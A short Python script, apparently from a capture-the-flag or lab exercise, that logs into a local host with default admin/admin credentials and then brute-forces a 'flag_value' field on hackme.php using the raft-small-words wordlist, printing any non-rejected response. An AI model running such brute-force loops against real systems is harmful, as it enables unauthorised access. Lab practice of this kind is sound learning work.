import requests
lines = []

with open("raft-small-words.txt","r") as raft:
    lines = raft.readlines()

s = requests.Session()

credentials = {
    'username': 'admin',
    'password': 'admin'
}

response = s.post('http://192.168.228.147/check.php', data=credentials)
#print(response.text)

#response1 = s.post('http://192.168.228.147/hackme.php')
#print(response1.text)

for i in lines:
    mydata = {'flag_value':i.replace("\n","")}
    # Set our post parameter of flag_value to the current work in raft-small-words.txt

    response2 = s.post('http://192.168.228.147/hackme.php', data=mydata)
    # Post the info to the hacme.php webpage using the current session (s)

    currentPageText = response2.text
    # Save the current page text to a variable

    if "brute-force" not in currentPageText:
        print(response2.text)
    # Check to see if the text above (brute-force) is not there. If it's not, show us what was actually returned!